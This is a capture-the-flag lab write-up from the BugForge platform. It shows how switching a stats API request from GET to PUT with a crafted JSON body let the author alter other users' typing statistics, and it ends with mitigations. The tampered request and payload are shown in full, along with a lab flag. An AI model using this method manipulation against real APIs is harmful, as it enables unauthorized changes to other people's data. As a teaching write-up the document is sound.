---
title: "Broken Access Control – Unauthorized Stats Modification via HTTP Method Manipulation | BugForge"
date: 2026-04-23 13:30:00 +0530
categories: [Web Security]
tags: [broken-access-control, 
  api, 
  http-method, 
  put, 
  jwt, 
  bugforge]
platform: BugForge
author: Shivansh Sharma
image:
  path: /assets/images/posts/bac-bugforge.webp
  alt: BAC BugForge Lab
---

## Overview

This lab demonstrates a **Broken Access Control** vulnerability in an API endpoint used for retrieving user statistics in a typing test application.

The issue arises because the server fails to properly validate **HTTP methods and authorization**, allowing an attacker to modify data by switching from a read-only request to a write operation.

---

## Objective

- Analyze API endpoints used by the application  
- Identify improper access control mechanisms  
- Exploit method-based authorization flaws  

---

## Reconnaissance

While exploring the application, an API endpoint was identified:

```http
GET /api/stats HTTP/2
```

The request included a valid JWT token:

```
Authorization: Bearer <JWT_TOKEN>
```

This endpoint was used to fetch user statistics.

---

## Exploitation

### Step 1: Identify potential method misuse

The endpoint was originally accessed using a `GET` request, which should only retrieve data. However, the server did not enforce strict method validation.

### Step 2: Modify the HTTP method

The request method was changed from:

```
GET /api/stats
```

to:

```
PUT /api/stats
```

### Step 3: Inject modified data

A JSON body was added to update statistics:

```json
{
  "id": 3,
  "user_id": 2,
  "total_sessions": 1,
  "best_wpm": 0,
  "avg_wpm": 0,
  "total_chars_typed": 0,
  "total_time_seconds": 15,
  "personal_bests": [
    {
      "id": 1,
      "user_id": 4,
      "duration": 15,
      "char_type": "mixed",
      "wpm": 0,
      "accuracy": 0,
      "session_date": "2026-04-24 04:48:50"
    }
  ]
}
```

### Step 4: Observe the response

The server accepted the request and updated the data:

```json
{
  "message": "Stats updated successfully",
  "flag": "bug{yVs0qAt9YUEjiABNKdaLlkt68dthjbCO}"
}
```

---

## Proof of Exploitation

- A read-only endpoint (`GET /api/stats`) was modified to perform write operations
- The server accepted a `PUT` request without proper authorization checks
- Arbitrary user data was modified successfully

---

## Impact

- Unauthorized modification of user statistics
- Data integrity compromise
- Potential abuse for leaderboard manipulation
- Exposure of sensitive application functionality

---

## Mitigation

- Enforce strict HTTP method validation on endpoints
- Implement proper role-based access control (RBAC)
- Validate ownership of resources before allowing updates
- Separate read and write endpoints securely
- Do not rely solely on JWT presence; validate permissions

---

## Real-World Insight

APIs are a common attack surface in modern applications. Many developers assume that:

- `GET` = safe
- `PUT/POST` = protected

But if the backend does not enforce this properly, attackers can simply switch methods and gain unintended access.

This type of flaw is frequently seen in:

- REST APIs
- Mobile backend services
- Single-page applications (SPAs)

Understanding HTTP method manipulation is crucial for identifying real-world API vulnerabilities.